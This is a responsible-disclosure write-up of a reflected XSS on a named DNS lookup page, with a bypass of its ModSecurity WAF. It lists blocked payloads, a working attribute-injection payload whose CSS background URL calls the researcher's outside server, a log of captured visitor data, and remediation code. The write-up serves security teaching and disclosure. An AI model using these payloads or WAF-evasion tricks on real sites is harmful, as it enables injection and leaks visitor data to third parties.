## Reflected XSS with WAF Bypass via HTML Attribute Injection

Report made June 13-14, 2020 to www.elhacker.net where I found a Reflected XSS vulnerability protected by ModSecurity WAF.

## Initial Discovery

While testing the DNS lookup tool at `https://www.elhacker.net/registros-dns.html`, I discovered that the `domain` parameter was vulnerable to XSS:

```
view-source:https://www.elhacker.net/registros-dns.html?domain=#">alert()
```

Initial observation: Using `/` in the parameter prevented the full page from loading. Using `#">` allowed breaking out of the input field.

## WAF Analysis

The site was protected by ModSecurity WAF with strict rules blocking common XSS vectors. All attempts were blocked with HTTP 500 responses and logged.

### Blocked Payloads

The following common XSS vectors were blocked by the WAF:

**1. Event handlers with `javascript:` pseudo-protocol:**

```
domain=a"+onLoad="javascript:prompt();">
```

WAF Rule: `Pattern match "javascript:" at THE_REQUEST [severity "EMERGENCY"]`

**2. Standard SVG XSS:**

```
domain=#"><svg/onload=alert()>
```

WAF Rule: `Pattern match "<" at THE_REQUEST [severity "EMERGENCY"]`

**3. Location-based bypass attempts:**

```
domain=#"><svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]#:()
```

WAF Rule: `Pattern match "<" at THE_REQUEST`

**4. Eval-based bypass:**

```
domain=#"><svg/onload=eval(location.hash.slice(1))>?#alert(1)
```

WAF Rule: `Pattern match "<" at THE_REQUEST`

**5. Window.location redirection:**

```
domain=a"+onload='window.location="http://smlearningfullstack.000webhostapp.com/index2.php"'>
```

WAF Rule: `Pattern match "window.location" at THE_REQUEST [severity "EMERGENCY"]`

## Successful WAF Bypass

After analyzing the WAF rules, I discovered that HTML attribute injection was not properly filtered. The successful payload used CSS background URL to exfiltrate data and inject arbitrary HTML attributes:

### Working Payload

```html
domain=a"+placeholder="prompt();"+style='background:url("https://smlearningfullstack.000webhostapp.com/index2.php")'> 
```

**Full URL:**
```
https://www.elhacker.net/registros-dns.html?domain=a"+placeholder="prompt();"+style='background:url("https://smlearningfullstack.000webhostapp.com/index2.php")'> 
```

### How It Works

1. **Breaking out of the input:** `a"` closes the domain value
2. **Injecting placeholder attribute:** `placeholder="prompt();"` 
3. **CSS exfiltration:** `style='background:url("https://attacker.com/index2.php")'`
4. **Closing the tag:** `>`

## Data Exfiltration Proof

The CSS background URL successfully triggered a request to my controlled server, logging victim data:

```
Server Time: 2020-06-14 09:04:48
Victim IP: 37.10.159.61
X-Forwarded-For: 37.10.159.61
Referer: https://www.elhacker.net/registros-dns.html?domain=a%22+placeholder=%22prompt();%22+style=%27background:url(%22https://smlearningfullstack.000webhostapp.com/index2.php%22)%27%3E
User-Agent: Mozilla/5.0 (Linux; Android 4.4.4; SAMSUNG SM-J100H Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36
```

## ModSecurity Logs

The webmaster confirmed the testing activity and provided ModSecurity logs showing the blocked attempts. Example log entry:

```
Request: www.elhacker.net 37.10.158.250 - - [13/Jun/2020:22:43:07 +0200]
"GET /registros-dns.html?domain=a%22+onLoad=%22javascript:prompt();%22%3E HTTP/1.1" 500

mod_security-action: 500
mod_security-message: Access denied with code 500. Pattern match "javascript:" at THE_REQUEST [severity "EMERGENCY"]
```

## Technical Analysis

### WAF Weaknesses

The ModSecurity configuration had the following weaknesses:

1. **Focused on script tags and event handlers** - Blocked `<`, `javascript:`, `window.location`
2. **Missed attribute injection** - Did not properly validate HTML attribute injection
3. **No CSS URL filtering** - Allowed `background:url()` for data exfiltration
4. **Insufficient contextual validation** - Did not validate the complete HTML context

### Why It Worked

The payload bypassed the WAF because:
- No `<` character (avoided script tag detection)
- No `javascript:` pseudo-protocol
- Used valid HTML attributes (`placeholder`, `style`)
- CSS `url()` was not on the blocklist

## Impact

While the injected JavaScript (`placeholder="prompt();"`) would not execute directly, the vulnerability demonstrates:

1. **HTML injection** - Arbitrary attributes can be injected
2. **CSS-based data exfiltration** - Background URLs leak visitor data to attacker's server
3. **WAF bypass** - The protection can be circumvented
4. **Potential for escalation** - Other attribute-based attacks possible

## Remediation

### Server-Side Fixes

1. **Proper input validation:**
```php
$domain = filter_var($_GET['domain'], FILTER_VALIDATE_DOMAIN);
if (!$domain) {
    die('Invalid domain');
}
```

2. **Output encoding:**
```php
echo htmlspecialchars($domain, ENT_QUOTES, 'UTF-8');
```

3. **Content Security Policy:**
```
Content-Security-Policy: default-src 'self'; style-src 'self'
```

### WAF Improvements

1. Add rules to detect attribute injection patterns
2. Block `style=` attribute in user input
3. Implement contextual output validation
4. Add logging for suspicious attribute patterns

## Disclosure Timeline

- **June 13, 2020 21:56-23:14**: Vulnerability discovered and tested
- **June 13, 2020**: Reported to webmaster@elhacker.net
- **June 14, 2020**: Response received with ModSecurity logs
- **June 14, 2020**: Provided successful bypass proof

## Note

This was a responsible disclosure. The webmaster acknowledged the report and confirmed the testing activity through server logs. The script was originally written in 2013 and had legacy security issues.
